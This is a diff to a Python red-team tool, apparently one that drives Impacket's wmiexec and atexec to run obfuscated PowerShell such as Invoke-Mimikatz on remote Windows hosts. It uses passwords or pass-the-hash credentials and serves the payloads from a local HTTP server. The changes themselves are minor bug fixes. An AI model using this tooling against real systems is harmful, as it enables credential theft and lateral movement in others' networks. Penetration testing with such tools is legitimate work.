@@ -28,7 +28,7 @@ INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT
 LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
-import base64, sys, argparse, re, subprocess, os
+import base64, sys, argparse, re, subprocess, os, time
 
 try:
     import netifaces
@@ -241,7 +241,7 @@ def hash_test(LM, NTLM, pwd):
 def http_server(port, working_dir):
     null = open('/dev/null', 'w')
     sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
-    #sleep(1)
+    #time.sleep(1)
     return sub_proc
 
 def main():
@@ -367,7 +367,7 @@ Create Pasteable Double Encoded Script:
     cwd = str(os.path.dirname(payload))
     if "/" not in cwd:
         cwd = str(os.getcwd())
-    payload = os.path.splitext(payload)
+    payload = os.path.basename(payload)
     if aes != None:
         kerberos = True
     payload = ''.join(payload)
@@ -472,7 +472,7 @@ Create Pasteable Double Encoded Script:
         execution = "invoker"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
-    if executor:
+    elif executor:
         if "Invoke-Mimikatz.ps1" in payload or "Invoke-Mimikatz" in mim_func:
             sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
         execution = "executor"
@@ -529,12 +529,12 @@ Create Pasteable Double Encoded Script:
             if attacks:
                 srv = http_server(src_port, cwd)
                 print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
-            if hash:
-                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
-            else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            if command == "cmd.exe":
-                sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
+                if hash:
+                    print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+                else:
+                    print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+                if command == "cmd.exe":
+                    sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
             if attacks and not encoder:
                 attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 attack.run(dst)
@@ -572,6 +572,8 @@ Create Pasteable Double Encoded Script:
             attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
             attack.play(dst)
             if attacks and not encoder:
+                srv = http_server(src_port, cwd)
+                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
                 else:
